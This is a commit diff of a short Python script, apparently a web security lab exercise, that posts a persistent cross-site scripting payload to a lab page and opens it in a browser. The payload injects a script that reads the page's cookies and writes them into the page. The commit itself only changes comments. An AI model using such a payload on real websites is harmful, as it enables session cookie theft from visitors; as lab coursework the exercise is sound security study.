a8ef6cee1d037e402ac5d68459b1b4ae2d3b4907
Yumingyuan <timdavid@vip.qq.com>
2019-05-24 15:40:59 +0800

    case04 Persistent XSS

--- wsb/case04_Persistent_XSS.py
+++ wsb/case04_Persistent_XSS.py
@@ -5,8 +5,5 @@ base_url="http://www.wsb.com/Assignment2/case04.php"
 payload={"title":"yumingyuan","content":"<script>div_object=document.createElement('p');div_object.id='yum1ngyuan';div_object.innerHTML=document.cookie;document.body.appendChild(div_object);</script>"}
 #post malicious code
 r=requests.post(base_url,data=payload)
-#try to get flag
-#r=requests.get(base_url)
-#print(r.text)
-#use web browser to open check attack result
+#try to get flag use web browser to open check attack result
 webbrowser.open("http://www.wsb.com/Assignment2/case04.php")
